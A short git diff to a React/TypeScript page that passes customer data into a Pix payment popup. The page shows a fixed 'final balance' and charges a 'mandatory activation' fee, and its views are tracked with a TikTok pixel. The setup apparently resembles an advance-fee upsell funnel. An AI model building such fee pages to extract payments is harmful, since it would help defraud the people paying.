@@ -3,6 +3,7 @@ import { useNavigate } from 'react-router-dom';
 import ParadisePixPopup from '@/components/ParadisePixPopup';
 import PageTransition from '@/components/PageTransition';
 import { trackViewContent } from '@/lib/tiktokPixel';
+import { useCustomerData } from '@/hooks/useCustomerData';
 import '../styles/app.css';
 
 const SALDO_FINAL = 2834.72;
@@ -20,6 +21,7 @@ const formatBR = (value: number) => {
 const Up1 = () => {
   const navigate = useNavigate();
   const [showPixPopup, setShowPixPopup] = useState(false);
+  const { customer } = useCustomerData();
 
   useEffect(() => {
     trackViewContent('Ativação TENF', TAXA_TENF);
@@ -96,6 +98,7 @@ const Up1 = () => {
             amount={TAXA_TENF_CENTAVOS}
             description="Ativação TENF obrigatório"
             productHash={PRODUCT_HASH}
+            customer={customer}
             onSuccess={handlePaymentSuccess}
             onClose={() => setShowPixPopup(false)}
           />
